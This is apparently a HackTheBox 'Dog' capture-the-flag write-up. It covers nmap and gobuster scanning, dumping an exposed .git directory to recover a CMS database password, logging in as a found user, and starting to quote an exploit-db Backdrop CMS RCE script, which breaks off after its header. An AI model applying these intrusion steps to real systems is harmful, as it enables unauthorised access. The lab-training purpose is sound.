                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      HackTheBox - Dog Writeup
    </h1>
    <div class="post-meta"><span title='2025-03-28 00:00:00 +0000 UTC'>March 28, 2025</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;0xblivion

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#overview" aria-label="Overview">Overview</a><ul>
                        <ul>
                        
                <li>
                    <a href="#test-attack-path-lang-to-d" aria-label="TEST ATTACK PATH LANG TO :D">TEST ATTACK PATH LANG TO :D</a></li></ul>
                    </ul>
                </li>
                <li>
                    <a href="#1-kicking-off-with-nmap" aria-label="1. Kicking Off with Nmap">1. Kicking Off with Nmap</a></li>
                <li>
                    <a href="#2-enumeration" aria-label="2. Enumeration">2. Enumeration</a><ul>
                        <ul>
                        
                <li>
                    <a href="#dumping-git-using-git-dumper" aria-label="Dumping .git/ using git-dumper">Dumping .git/ using git-dumper</a></li>
                <li>
                    <a href="#db-password" aria-label="DB Password">DB Password</a></li>
                <li>
                    <a href="#finding-a-valid-user" aria-label="Finding a valid user">Finding a valid user</a></li></ul>
                    </ul>
                </li>
                <li>
                    <a href="#3-foothold-and-user-flag" aria-label="3. Foothold and User flag">3. Foothold and User flag</a><ul>
                        <ul>
                        
                <li>
                    <a href="#exploit" aria-label="Exploit">Exploit</a></li></ul>
                    </ul>
                </li>
                <li>
                    <a href="#4-privilege-escalation-to-root" aria-label="4. Privilege Escalation to Root">4. Privilege Escalation to Root</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h1>
<p><img alt="Dog card" loading="lazy" src="/img/dog/Dog.png"></p>
<p>This box focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed <code>.git</code> directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as <code>www-data</code>. For privilege escalation, we discover that a user (<code>johncusack</code>) can execute a PHP utility (<code>bee</code>) as root, which we then abuse to spawn a root shell.</p>



<div id="flowchart-1752005338730491973" class="attack-path-flowchart">
  <div class="flowchart-controls">
    <button class="zoom-btn" data-action="zoom-in" title="Zoom In">+</button>
    <button class="zoom-btn" data-action="zoom-out" title="Zoom Out">−</button>
    <button class="zoom-btn" data-action="reset" title="Reset View">⌂</button>
  </div>
  <div class="flowchart-data" style="display: none;">
[https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan
[https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Access .git Directory  
[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Extract settings.php → DB Creds  
[https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Login as CMS User  
[https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Upload Malicious Module (RCE)  
[https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Trigger Web Shell (www-data)  
[https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Password Spray SSH Users  
[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]SSH as johncusack  
[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Run `sudo bee` to Eval PHP  
[https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]Gain Root Access 
</div>
</div>


  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" xintegrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js" xintegrity="sha512-M1h0i4zB/nNoM+3TLA+q3EViN9yQ9LpIq6W2daLpZ1B13Y4YI3wE4F28M3aEfsyyHn5j2vAxw8U2tKjB6i/w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  


<style>
.attack-path-flowchart {
  width: 100%;
  height: 500px;
  background: transparent;
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 8px;
  position: relative;
  overflow: hidden;
  margin: 2rem 0;
}

.flowchart-controls {
  position: absolute;
  top: 10px;
  right: 10px;
  z-index: 1000;
  display: flex;
  gap: 5px;
}

.zoom-btn {
  width: 32px;
  height: 32px;
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(255, 255, 255, 0.2);
  border-radius: 4px;
  color: #fff;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.2s ease;
}

.zoom-btn:hover {
  background: rgba(0, 0, 0, 0.9);
  border-color: rgba(255, 255, 255, 0.4);
}

.flowchart-svg {
  width: 100%;
  height: 100%;
  background: transparent;
  cursor: grab;
}

.flowchart-svg:active {
  cursor: grabbing;
}

.flowchart-node {
  cursor: pointer;
}

.flowchart-icon {
  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;
  font-weight: 900;
  font-size: 36px;
  text-anchor: middle;
  dominant-baseline: central;
  transition: all 0.3s ease;
  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));
}

.flowchart-image {
  transition: all 0.3s ease;
  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));
}

.flowchart-text {
  font-family: 'Courier New', 'Monaco', 'Consolas', monospace;
  font-size: 10px;
  font-weight: 600;
  text-anchor: middle;
  pointer-events: none;
  user-select: none;
  fill: #ddd;
}

.flowchart-arrow {
  stroke: rgba(255, 255, 255, 0.4);
  stroke-width: 1.5px;
  transition: all 0.2s ease-in-out;
}

.flowchart-arrow.glow {
  stroke: rgba(255, 255, 255, 1);
  stroke-width: 2.5px;
  filter: drop-shadow(0 0 4px rgba(255, 255, 255, 0.7));
}

.flowchart-arrow-marker {
  fill: rgba(255, 255, 255, 0.6);
}

.flowchart-pin-icon {
  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;
  font-weight: 900;
  font-size: 16px;
  fill: #DC143C;  
  text-anchor: middle;
  dominant-baseline: central;
  display: none;  
  pointer-events: none;
  filter: drop-shadow(0 1px 2px rgba(0,0,0,0.7));
}


 
.node-recon .flowchart-icon { color: #A0522D; }  
.node-enum .flowchart-icon { color: #4169E1; }  
.node-exploit .flowchart-icon { color: #DC143C; }  
.node-access .flowchart-icon { color: #2E8B57; }  
.node-privesc .flowchart-icon { color: #FF8C00; }  
.node-root .flowchart-icon { color: #FFD700; }  
.node-default .flowchart-icon { color: #A9A9A9; }  
</style>

<script>
(function() {
  
  "use strict";

  let flowchartInstances = {};

  const iconMap = {
    recon: '\uf002', enum: '\uf0ca', exploit: '\uf1e2',
    access: '\uf084', privesc: '\uf21b', root: '\uf624', default: '\uf059',
    pin: '\uf08d',
  };

  function initFlowcharts() {
    const containers = document.querySelectorAll('.attack-path-flowchart');
    containers.forEach(container => {
      if (container.dataset.initialized) return;
      container.dataset.initialized = 'true';

      const id = container.id;
      const dataDiv = container.querySelector('.flowchart-data');
      if (dataDiv) {
        const steps = parseSteps(dataDiv.textContent);
        if (steps.length > 0) {
          flowchartInstances[id] = createInteractiveFlowchart(container, steps);
          setupControls(container, id);
        }
      }
    });
  }

  function setupControls(container, id) {
    const instance = flowchartInstances[id];
    if (!instance) return;
    container.querySelectorAll('.zoom-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        const action = btn.getAttribute('data-action');
        if (action === 'zoom-in') {
            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1.2);
        } else if (action === 'zoom-out') {
            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1 / 1.2);
        } else if (action === 'reset') {
          instance.svg.transition().ease(d3.easeCubicOut).duration(750).call(instance.zoom.transform, d3.zoomIdentity);
        }
      });
    });
  }

  function parseSteps(content) {
    return content.split('\n').map(l => l.trim()).filter(Boolean).map((line, idx) => {
      line = line.replace(/^[-*]\s*/, '');
      const imgRe = /\[\s*([^\]]+?)\s*\]\s*(.*)/;
      const match = line.match(imgRe);
      const text = match ? match[2].trim() : line;
      return { id: idx, text, type: getStepType(text), imageUrl: match ? match[1] : null, pinned: false };
    });
  }

  function getStepType(text) {
    const l = text.toLowerCase();
    if (l.includes('nmap') || l.includes('scan') || l.includes('recon')) return 'recon';
    if (l.includes('enum') || l.includes('directory') || l.includes('subdomain') || l.includes('git') || l.includes('dump') || l.includes('crawl')) return 'enum';
    if (l.includes('exploit') || l.includes('rce') || l.includes('sqli') || l.includes('xss') || l.includes('lfi') || l.includes('upload') || l.includes('injection')) return 'exploit';
    if (l.includes('shell') || l.includes('reverse') || l.includes('bind') || l.includes('webshell')) return 'access';
    if (l.includes('privesc') || l.includes('privilege') || l.includes('escalation') || l.includes('sudo') || l.includes('suid') || l.includes('kernel') || l.includes('creds')) return 'privesc';
    if (l.includes('root') || l.includes('administrator') || l.includes('system') || l.includes('sudo bee')) return 'root';
    return 'default';
  }

  function createInteractiveFlowchart(container, nodesData) {
    const W = container.clientWidth, H = container.clientHeight;
    const svg = d3.select(container).append('svg')
                  .attr('class','flowchart-svg').attr('width',W).attr('height',H);

    const zoom = d3.zoom().duration(500).scaleExtent([0.1, 5]).on('zoom', e => g.attr('transform', e.transform));

    svg.call(zoom);
    const g = svg.append('g');

    const defs = svg.append('defs');
    defs.append('marker')
        .attr('id','arrowhead').attr('viewBox','-0 -5 10 10')
        .attr('refX', 25).attr('refY', 0)
        .attr('orient','auto').attr('markerWidth', 5).attr('markerHeight', 5)
      .append('path').attr('d', 'M0,-5L10,0L0,5').attr('class','flowchart-arrow-marker');

    const links = nodesData.length > 1 ? d3.range(nodesData.length - 1).map(i => ({ source: nodesData[i], target: nodesData[i+1] })) : [];

    const arrows = g.append("g").selectAll("line")
      .data(links).enter().append("line")
      .attr("class", "flowchart-arrow")
      .attr("marker-end", "url(#arrowhead)");

    const nodeGroups = g.append("g").selectAll(".flowchart-node")
      .data(nodesData, d => d.id).enter().append("g")
      .attr("class", d => 'flowchart-node node-' + d.type);

    nodeGroups.each(function(d) {
      const node = d3.select(this);
      if (d.imageUrl) {
        node.append('image')
          .attr('href', d.imageUrl).attr('class', 'flowchart-image')
          .attr('x', -20).attr('y', -25).attr('width', 40).attr('height', 40)
          .on('error', function() {
            d3.select(this.parentNode).append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap['default']);
            d3.select(this).remove();
          });
      } else {
        node.append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap[d.type] || iconMap['default']);
      }
    });

    nodeGroups.append('text')
      .attr('class', 'flowchart-pin-icon')
      .attr('x', 20)
      .attr('y', -20)
      .text(iconMap.pin);

    nodeGroups.append('text').attr('class', 'flowchart-text').attr('y', 35)
      .each(function(d) { wrapText(d3.select(this), d.text, 100); });
    nodeGroups.append('title').text(d => d.text);

    const numNodes = nodesData.length;
    const padding = 120;
    const nodeRadius = 40;

    const linkForce = d3.forceLink(links).id(d => d.id).distance(150).strength(0.2);

    const simulation = d3.forceSimulation(nodesData)
        .force("link", linkForce)
        .force("charge", d3.forceManyBody().strength(-600))
        .force("collide", d3.forceCollide().radius(nodeRadius).strength(1))
        .force("x", d3.forceX(d => {
            if (numNodes <= 1) return W / 2;
            return padding + (d.id / (numNodes - 1)) * (W - 2 * padding);
        }).strength(0.4))
        .force("y", d3.forceY(d => {
            if (numNodes <= 1) return H / 2;
            const amplitude = H * 0.20;
            const frequency = Math.PI;
            const centerY = H / 2;
            const phase = (d.id / (numNodes - 1)) * frequency;
            return centerY - amplitude * Math.cos(phase);
        }).strength(0.5))
        .on("tick", () => {
          arrows
              .attr("x1", d => d.source.x)
              .attr("y1", d => d.source.y)
              .attr("x2", d => d.target.x)
              .attr("y2", d => d.target.y);
          nodeGroups
              .attr("transform", d => `translate(${d.x},${d.y})`);
        });

    const dragHandler = d3.drag()
        .on("start", function (event, d) {
            if (!event.active) simulation.alphaTarget(0.3).restart();
            d.fx = d.x;
            d.fy = d.y;
            
            arrows.filter(link => link.source.id === d.id).classed('glow', true);
            linkForce.strength(0); 
        })
        .on("drag", function (event, d) {
            d.fx = event.x;
            d.fy = event.y;
        })
        .on("end", function (event, d) {
            if (!event.active) simulation.alphaTarget(0);
            
            linkForce.strength(0.2); 
            
            arrows.filter(link => link.source.id === d.id).classed('glow', false);

            d.pinned = true;
            d3.select(this).select('.flowchart-pin-icon').style('display', 'block');
        });

    nodeGroups
      .call(dragHandler)
      .on('mouseover', (event, d) => {
        
        arrows.filter(link => link.source.id === d.id).classed('glow', true);
      })
      .on('mouseout', (event, d) => {
        
        arrows.filter(link => link.source.id === d.id).classed('glow', false);
      })
      .on('contextmenu', function(event, d) {
        event.preventDefault();
        
        if (d.pinned) {
          d.pinned = false;
          d.fx = null; 
          d.fy = null;
          d3.select(this).select('.flowchart-pin-icon').style('display', 'none');
          simulation.alpha(0.3).restart(); 
        }
      });

    return { svg, zoom, g };
  }

  function wrapText(textElem, str, maxW) {
    const words = str.split(/\s+/), lineHeight = 12, x = 0;
    textElem.text(null);
    let line = [], tspan = textElem.append('tspan').attr('x', x);
    for (const word of words) {
        line.push(word);
        tspan.text(line.join(' '));
        if (tspan.node().getComputedTextLength() > maxW && line.length > 1) {
            line.pop();
            tspan.text(line.join(' '));
            line = [word];
            tspan = textElem.append('tspan').attr('x', x).attr('dy', `${lineHeight}px`).text(word);
        }
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initFlowcharts);
  } else {
    initFlowcharts();
  }
})();
</script>

<h3 id="test-attack-path-lang-to-d"><strong>TEST ATTACK PATH LANG TO :D</strong><a hidden class="anchor" aria-hidden="true" href="#test-attack-path-lang-to-d">#</a></h3>
<hr>
<h1 id="1-kicking-off-with-nmap">1. Kicking Off with Nmap<a hidden class="anchor" aria-hidden="true" href="#1-kicking-off-with-nmap">#</a></h1>
<p>As always, we start with an <code>nmap</code> scan to see what services are running on the target.
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">sudo</span> nmap <span class="flag">-sVC</span> <span class="flag">-oA</span> nmap/dog 10.10.11.58 <span class="flag">-vv</span>
# Nmap 7.95 scan initiated Wed Jul  2 16:25:44 2025 as: /usr/lib/nmap/nmap <span class="flag">-sVC</span> <span class="flag">-oA</span> nmap/dog <span class="flag">-vv</span> 10.10.11.58
Nmap scan report for 10.10.11.58
Host is up, received echo-reply ttl 63 (0.055s latency).
Scanned at 2025-07-02 16:25:44 EDT for 9s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file <span class="string">'description'</span> to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul  2 16:25:53 2025 <span class="flag">--</span> 1 IP address (1 host up) scanned in 9.54 seconds
</code><button class="copy-code">copy</button></pre>
  </div>
</div>
</p>
<p>From the Nmap output, we observe an open SSH port (22/tcp) and an HTTP server (80/tcp) running Apache. The HTTP server reveals a <code>.git/</code> directory, indicating a Git repository, and identifies the web application as <code>Backdrop CMS</code>.</p>
<hr>
<h1 id="2-enumeration">2. Enumeration<a hidden class="anchor" aria-hidden="true" href="#2-enumeration">#</a></h1>
<p>We&rsquo;ll run <code>gobuster</code> in the background to discover more directories and files on the web server.
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">gobuster</span> dir <span class="flag">-u</span> http://10.10.11.58/ <span class="flag">-w</span> <span style="font-weight: bold;">/opt/SecLists/Discovery/Web-Content/raft-medium-words.txt</span>
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
<span class="indicator-success">[+]</span> Url:                     http://10.10.11.58/
<span class="indicator-success">[+]</span> Method:                  GET
<span class="indicator-success">[+]</span> Threads:                 10
<span class="indicator-success">[+]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt
<span class="indicator-success">[+]</span> Negative Status codes:   404
<span class="indicator-success">[+]</span> User Agent:              gobuster/3.6
<span class="indicator-success">[+]</span> Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/modules              (Status: 301) [Size: 312] [--> http://10.10.11.58/modules/]
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/themes               (Status: 301) [Size: 311] [--> http://10.10.11.58/themes/]
/.htm                 (Status: 403) [Size: 276]
/files                (Status: 301) [Size: 310] [--> http://10.10.11.58/files/]
/sites                (Status: 301) [Size: 310] [--> http://10.10.11.58/sites/]
/core                 (Status: 301) [Size: 309] [--> http://10.10.11.58/core/]
/.htaccess            (Status: 403) [Size: 276]
/.phtml               (Status: 403) [Size: 276]
/layouts              (Status: 301) [Size: 312] [--> http://10.10.11.58/layouts/]
/.htc                 (Status: 403) [Size: 276]
/.html_var_DE         (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.git                 (Status: 301) [Size: 309] [--> http://10.10.11.58/.git/]
/.html.               (Status: 403) [Size: 276]
/.html.html           (Status: 403) [Size: 276]
/.htpasswds           (Status: 403) [Size: 276]
/.htm.                (Status: 403) [Size: 276]
/.htmll               (Status: 403) [Size: 276]
/.phps                (Status: 403) [Size: 276]
/.html.old            (Status: 403) [Size: 276]
/.ht                  (Status: 403) [Size: 276]
/.html.bak            (Status: 403) [Size: 276]
/.htm.htm             (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htgroup             (Status: 403) [Size: 276]
/.html1               (Status: 403) [Size: 276]
/.html.LCK            (Status: 403) [Size: 276]
/.html.printable      (Status: 403) [Size: 276]
/.htm.LCK             (Status: 403) [Size: 276]
/.htaccess.bak        (Status: 403) [Size: 276]
/.html.php            (Status: 403) [Size: 276]
/.htmls               (Status: 403) [Size: 276]
/.htx                 (Status: 403) [Size: 276]
/.htlm                (Status: 403) [Size: 276]
/.htm2                (Status: 403) [Size: 276]
/.html-               (Status: 403) [Size: 276]
/.htuser              (Status: 403) [Size: 276]
/.htacess             (Status: 403) [Size: 276]
/.htm.d               (Status: 403) [Size: 276]
/.htm.html            (Status: 403) [Size: 276]
/.htm.old             (Status: 403) [Size: 276]
/.html-1              (Status: 403) [Size: 276]
/.html.orig           (Status: 403) [Size: 276]
/.html.sav            (Status: 403) [Size: 276]
/.html_               (Status: 403) [Size: 276]
/.html_files          (Status: 403) [Size: 276]
/.htmlpar             (Status: 403) [Size: 276]
/.htmlprint           (Status: 403) [Size: 276]
/.hts                 (Status: 403) [Size: 276]
Progress: 63088 / 63089 (100.00%)
===============================================================
Finished
===============================================================
</code><button class="copy-code">copy</button></pre>
  </div>
</div>
</p>
<p>The <code>gobuster</code> scan confirms the presence of the <code>.git</code> directory, which was also found by Nmap. Since Backdrop CMS is open-source, we&rsquo;ll focus on the <code>.git</code> directory for potential information disclosure.</p>
<h3 id="dumping-git-using-git-dumper">Dumping .git/ using git-dumper<a hidden class="anchor" aria-hidden="true" href="#dumping-git-using-git-dumper">#</a></h3>
<p>We&rsquo;ll use <a href="https://github.com/arthaud/git-dumper">git-dumper</a> to extract the contents of the <code>.git</code> repository from the web server.</p>
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">mkdir</span> git-dump; <span style="color:#49aee6">git-dumper</span> http://10.10.11.58/ git-dump/
[~] Testing http://10.10.11.58/.git/HEAD [200]
[~] Testing http://10.10.11.58/.git/ [200]
[~] Fetching .git recursively
[~] Fetching http://10.10.11.58/.gitignore [404]
[~] http://10.10.11.58/.gitignore responded with status code 404
[~] Fetching http://10.10.11.58/.git/ [200]
[~] Fetching http://10.10.11.58/.git/objects/ [200]
[~] Fetching http://10.10.11.58/.git/HEAD [200]
[~] Fetching http://10.10.11.58/.git/COMMIT_EDITMSG [200]
[~] Fetching http://10.10.11.58/.git/config [200]
[~] Fetching http://10.10.11.58/.git/branches/ [200]
[~] Fetching http://10.10.11.58/.git/hooks/ [200]
[~] Fetching http://10.10.11.58/.git/description [200]
[~] Fetching http://10.10.11.58/.git/logs/ [200]
[~] Fetching http://10.10.11.58/.git/refs/ [200]
...SNIP..
</code><button class="copy-code">copy</button></pre>
  </div>
</div>

<h3 id="db-password">DB Password<a hidden class="anchor" aria-hidden="true" href="#db-password">#</a></h3>
<p>Within the dumped <code>.git</code> repository, we found a <code>settings.php</code> file in the root directory that contains database credentials.
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">head</span> <span class="flag">-n</span> 16 <span style="font-weight: bold;">settings.php</span>
&lt;?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = <span class="string">'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop'</span>;
$database_prefix = <span class="string">''</span>;

</code><button class="copy-code">copy</button></pre>
  </div>
</div>
</p>
<p>The credentials found are <code>root</code>:<code>BackDropJ2024DS2024</code>.</p>
<p>We attempted to log in to the website&rsquo;s admin panel using these credentials, but <code>root</code> was not a valid username.</p>
<p><img alt="Invald creds" loading="lazy" src="/img/dog/Invalid_Creds.png"></p>
<h3 id="finding-a-valid-user">Finding a valid user<a hidden class="anchor" aria-hidden="true" href="#finding-a-valid-user">#</a></h3>
<p>We used <code>grep</code> to recursively search for strings containing <code>dog.htb</code> within the dumped Git repository, hoping to find valid usernames.</p>
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">grep</span> <span class="flag">-Ri</span> dog.htb
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        <span style="color:#f22c3d">"tiffany@dog.htb"</span>
.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000    commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000       commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases

</code><button class="copy-code">copy</button></pre>
  </div>
</div>

<p>We found a potential username: <code>tiffany@dog.htb</code>.</p>
<p>We added the domain to our <code>/etc/hosts</code> file for easier access.
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">echo</span> <span class="string">"10.10.11.58 dog.htb"</span> | <span style="color: #49aee6">sudo</span> tee <span class="flag">-a</span> <span style="font-weight: bold;">/etc/hosts</span>
</code><button class="copy-code">copy</button></pre>
  </div>
</div>
</p>
<p>Using <code>tiffany</code> as the username and <code>BackDropJ2024DS2024</code> as the password, we were able to log into the Backdrop CMS admin panel.</p>
<p><img alt="Admin Panel" loading="lazy" src="/img/dog/admin_panel.png"></p>
<hr>
<h1 id="3-foothold-and-user-flag">3. Foothold and User flag<a hidden class="anchor" aria-hidden="true" href="#3-foothold-and-user-flag">#</a></h1>
<p>Now that we have authenticated access to the Backdrop CMS admin panel, we&rsquo;ll look for a way to gain a shell. We searched for exploits related to <strong>&ldquo;Backdrop CMS&rdquo;</strong> and found an authenticated RCE exploit on <code>exploit-db</code>.</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/52021">https://www.exploit-db.com/exploits/52021</a></li>
</ul>
<p><img alt="Exploit-db" loading="lazy" src="/img/dog/exploit-db.png"></p>
<p>The exploit script generates a malicious module (<code>shell.zip</code>) that can be uploaded to the CMS.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Title: Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Date: 04/27/2024</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Author: Ahmet Ümit BAYRAM</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Vendor Homepage: https://backdropcms.org/</span>
